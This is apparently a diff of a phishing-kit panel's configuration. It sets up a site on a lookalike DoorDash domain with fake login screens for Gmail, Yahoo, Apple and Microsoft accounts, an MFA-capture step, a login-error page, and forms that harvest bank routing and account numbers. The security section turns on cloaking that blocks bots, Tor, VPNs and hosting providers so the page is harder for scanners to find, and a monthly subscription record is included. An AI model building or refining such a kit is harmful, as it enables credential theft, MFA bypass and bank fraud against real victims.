@@ -181,6 +181,20 @@
                                 "fieldManifest": {
                                         "fields": [
                                                 {
+                                                        "id": "fld_email_c62a7572cf0a",
+                                                        "type": "email",
+                                                        "label": "Email address",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "email",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Email address",
+                                                        "sourceRequired": false
+                                                },
+                                                {
                                                         "id": "fld_password_a8da59a403d8",
                                                         "type": "password",
                                                         "label": "Password",
@@ -196,11 +210,12 @@
                                                 }
                                         ],
                                         "version": 1,
-                                        "revision": "sha256:f4032391108fef77213536b5cf2dbe2a7fade0cee1704e1b182fa32db3a5b668",
+                                        "revision": "sha256:d07804001787e637f1dfb7feb4fe2b0e2b1f716e56d0cefc62830df96afe7425",
                                         "screenId": "scr_de7eeacc12918f",
                                         "warnings": [],
                                         "needsReview": false
                                 },
+                                "allowPushValue": false,
                                 "showInRedirects": true
                         },
                         {
@@ -235,6 +250,7 @@
                                         "warnings": [],
                                         "needsReview": false
                                 },
+                                "allowPushValue": false,
                                 "showInRedirects": true
                         },
                         {
@@ -248,6 +264,20 @@
                                 "needsReview": false,
                                 "fieldManifest": {
                                         "fields": [
+                                                {
+                                                        "id": "fld_email_c62a7572cf0a",
+                                                        "type": "email",
+                                                        "label": "Email or phone",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "email",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Email or phone",
+                                                        "sourceRequired": false
+                                                },
                                                 {
                                                         "id": "fld_password_a8da59a403d8",
                                                         "type": "password",
@@ -278,11 +308,12 @@
                                                 }
                                         ],
                                         "version": 1,
-                                        "revision": "sha256:2075abd6084ba214364498468c150c00e28f0310c152792a3d25ea66693e8192",
+                                        "revision": "sha256:961f5b21c86df03bfea6b4350ae92dc16b94c828ff00d1e90b4906a6d0fcf280",
                                         "screenId": "scr_ba35ea8db56616",
                                         "warnings": [],
                                         "needsReview": false
                                 },
+                                "allowPushValue": false,
                                 "showInRedirects": true
                         },
                         {
@@ -296,6 +327,20 @@
                                 "needsReview": false,
                                 "fieldManifest": {
                                         "fields": [
+                                                {
+                                                        "id": "fld_email_c62a7572cf0a",
+                                                        "type": "email",
+                                                        "label": "Apple Account",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "email",
+                                                        "needsReview": false,
+                                                        "sensitivity": "financial",
+                                                        "sourceLabel": "Apple Account",
+                                                        "sourceRequired": false
+                                                },
                                                 {
                                                         "id": "fld_password_a8da59a403d8",
                                                         "type": "password",
@@ -326,11 +371,12 @@
                                                 }
                                         ],
                                         "version": 1,
-                                        "revision": "sha256:32fb9326fa2d52f47c9b39e9f28bc379d04c336d363c6d45063f3cea4d8f9bc9",
+                                        "revision": "sha256:fa4a2158ed8ddc900d0f2e3c418152ac46816cffd39125630f73e695524ecfaf",
                                         "screenId": "scr_3905051cc2975a",
                                         "warnings": [],
                                         "needsReview": false
                                 },
+                                "allowPushValue": false,
                                 "showInRedirects": true
                         },
                         {
@@ -340,7 +386,7 @@
                                 "stage": "form",
                                 "state": "default",
                                 "enabled": true,
-                                "buttonLabel": "Entry",
+                                "buttonLabel": "Login",
                                 "needsReview": false,
                                 "fieldManifest": {
                                         "fields": [
@@ -379,6 +425,7 @@
                                         "warnings": [],
                                         "needsReview": false
                                 },
+                                "allowPushValue": false,
                                 "showInRedirects": true
                         },
                         {
@@ -393,39 +440,19 @@
                                 "fieldManifest": {
                                         "fields": [
                                                 {
-                                                        "id": "fld_password_a8da59a403d8",
-                                                        "type": "password",
-                                                        "label": "Password",
+                                                        "id": "fld_email_c62a7572cf0a",
+                                                        "type": "email",
+                                                        "label": "Email, phone, or Skype",
                                                         "policy": "redact",
                                                         "enabled": true,
                                                         "scopeId": "page",
                                                         "required": false,
-                                                        "sourceType": "password",
+                                                        "sourceType": "email",
                                                         "needsReview": false,
-                                                        "sensitivity": "authentication-secret",
-                                                        "sourceLabel": "Password",
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Email, phone, or Skype",
                                                         "sourceRequired": false
-                                                }
-                                        ],
-                                        "version": 1,
-                                        "revision": "sha256:b026df2b919dbda58d8546e5b0e32c563eadd822e1cf039f834deab7b6d2e4b6",
-                                        "screenId": "scr_d33bd66d719188",
-                                        "warnings": [],
-                                        "needsReview": false
-                                },
-                                "showInRedirects": true
-                        },
-                        {
-                                "id": "scr_dd0226b9b6c381",
-                                "file": "yahoo.html",
-                                "order": 6,
-                                "stage": "other",
-                                "state": "default",
-                                "enabled": true,
-                                "buttonLabel": "Yahoo",
-                                "needsReview": false,
-                                "fieldManifest": {
-                                        "fields": [
+                                                },
                                                 {
                                                         "id": "fld_password_a8da59a403d8",
                                                         "type": "password",
@@ -442,11 +469,61 @@
                                                 }
                                         ],
                                         "version": 1,
-                                        "revision": "sha256:54ea9c09e6f37fede067c5d81e99a7c92a24257702db98266c7200e3213f3c74",
+                                        "revision": "sha256:3f1057858f250cf48cb0054a14fff1abcb730f49fab5a2beff73d9f302f2d6b3",
+                                        "screenId": "scr_d33bd66d719188",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "allowPushValue": false,
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_dd0226b9b6c381",
+                                "file": "yahoo.html",
+                                "order": 6,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Yahoo",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_email_c62a7572cf0a",
+                                                        "type": "email",
+                                                        "label": "Email or phone",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "email",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Email or phone",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_password_a8da59a403d8",
+                                                        "type": "password",
+                                                        "label": "Password",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Password",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:057ee9f7f31e53b8622ee3a7fbff963f412c779b5c9f6560481d2252f56089fe",
                                         "screenId": "scr_dd0226b9b6c381",
                                         "warnings": [],
                                         "needsReview": false
                                 },
+                                "allowPushValue": false,
                                 "showInRedirects": true
                         },
                         {
@@ -456,7 +533,7 @@
                                 "stage": "other",
                                 "state": "default",
                                 "enabled": true,
-                                "buttonLabel": "Auth Dev Gmail",
+                                "buttonLabel": "Gmail MFA",
                                 "needsReview": false,
                                 "fieldManifest": {
                                         "fields": [
@@ -481,6 +558,7 @@
                                         "warnings": [],
                                         "needsReview": false
                                 },
+                                "allowPushValue": true,
                                 "showInRedirects": true
                         },
                         {
@@ -500,6 +578,7 @@
                                         "warnings": [],
                                         "needsReview": false
                                 },
+                                "allowPushValue": false,
                                 "showInRedirects": true
                         },
                         {
@@ -519,26 +598,178 @@
                                         "warnings": [],
                                         "needsReview": false
                                 },
+                                "allowPushValue": false,
                                 "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_b20327f663e4a5",
+                                "file": "Loginerror.html",
+                                "order": 10,
+                                "stage": "form",
+                                "state": "error",
+                                "enabled": true,
+                                "buttonLabel": "Login Error",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_email_c62a7572cf0a",
+                                                        "type": "email",
+                                                        "label": "Email",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "email",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Email",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_password_a8da59a403d8",
+                                                        "type": "password",
+                                                        "label": "Password",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Password",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:cb813f6a5b121004848e9014dc9276cae764cc5f53ea6bff69f0705dd974c272",
+                                        "screenId": "scr_b20327f663e4a5",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "allowPushValue": false,
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_24013e420da03c",
+                                "file": "accnrn.html",
+                                "order": 11,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Accnrn",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_routingnumber_7131e0a4d346",
+                                                        "type": "text",
+                                                        "label": "Routing number",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "financial",
+                                                        "sourceLabel": "Routing number",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_accountnumber_291bca5331b5",
+                                                        "type": "text",
+                                                        "label": "Account number",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "financial",
+                                                        "sourceLabel": "Account number",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:1b601b19d6d8a0ed9ddc04a0678b40e7ad2b526f5f93989dec61bb6719118122",
+                                        "screenId": "scr_24013e420da03c",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "allowPushValue": false,
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_61f9fc3c3e677f",
+                                "file": "Acc&Rn.html",
+                                "order": 12,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": false,
+                                "buttonLabel": "Acc&Rn",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_routingnumber_7131e0a4d346",
+                                                        "type": "text",
+                                                        "label": "Routing number",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "financial",
+                                                        "sourceLabel": "Routing number",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_accountnumber_291bca5331b5",
+                                                        "type": "text",
+                                                        "label": "Account number",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "text",
+                                                        "needsReview": false,
+                                                        "sensitivity": "financial",
+                                                        "sourceLabel": "Account number",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:a6c44f11e634d6ad6c7ca128f13fe0e8c4233d80805cf92fc7e34161f7036a0e",
+                                        "screenId": "scr_61f9fc3c3e677f",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "allowPushValue": false,
+                                "showInRedirects": false
                         }
                 ]
         },
         "apiBase": "/api",
-        "generatedAt": "2026-09-16T23:07:45.678Z",
-        "domain": "doordashonline.help",
+        "generatedAt": "2026-11-02T14:06:25.866Z",
+        "domain": "app.onlinedordash.help",
         "hosting": {
-                "domain": "doordashonline.help",
+                "domain": "app.onlinedordash.help",
                 "connectionType": "cloudflare-worker"
         },
         "allowedDomains": [
-                "doordashonline.help"
+                "app.onlinedordash.help"
         ],
         "subscription": {
                 "autoRenew": true,
-                "renewalDate": "2026-10-16",
+                "renewalDate": "2026-11-25",
                 "renewalPrice": 150,
                 "walletSource": "main-wallet",
                 "billingPeriod": "monthly",
+                "lastRenewedAt": "2026-10-26T18:04:26.126Z",
+                "renewalStatus": "active",
+                "paymentFailedAt": "2026-10-23T19:32:49.446Z",
+                "lastRenewalError": "Insufficient wallet balance",
                 "adminFreeSubscription": false
         },
         "resultSettings": {
@@ -548,26 +779,29 @@
                 "telegramNotifyOnResult": false
         },
         "security": {
-                "captcha": false,
+                "captcha": true,
                 "domains": [
-                        "doordashonline.help"
+                        "app.onlinedordash.help"
                 ],
                 "bannedIps": [],
                 "turnstile": {
-                        "enabled": false,
+                        "enabled": true,
                         "provider": "turnstile",
-                        "siteKey": "",
-                        "displayDomain": ""
+                        "siteKey": "0x4AAAAAAE5dTDPO1CvEBgyL",
+                        "displayDomain": "doordash.com"
                 },
                 "whitelistIps": [],
                 "vpnProxyRules": {
-                        "blockTor": false,
-                        "blockVpnProxies": false,
-                        "blockHostingProviders": false,
+                        "blockTor": true,
+                        "blockVpnProxies": true,
+                        "blockHostingProviders": true,
                         "reputationFailureMode": "challenge"
                 },
-                "blockedDevices": [],
-                "contentDeterrence": false,
+                "blockedDevices": [
+                        "bot",
+                        "other"
+                ],
+                "contentDeterrence": true,
                 "turnstileSecretConfigured": false
         },
         "generatedFile": {
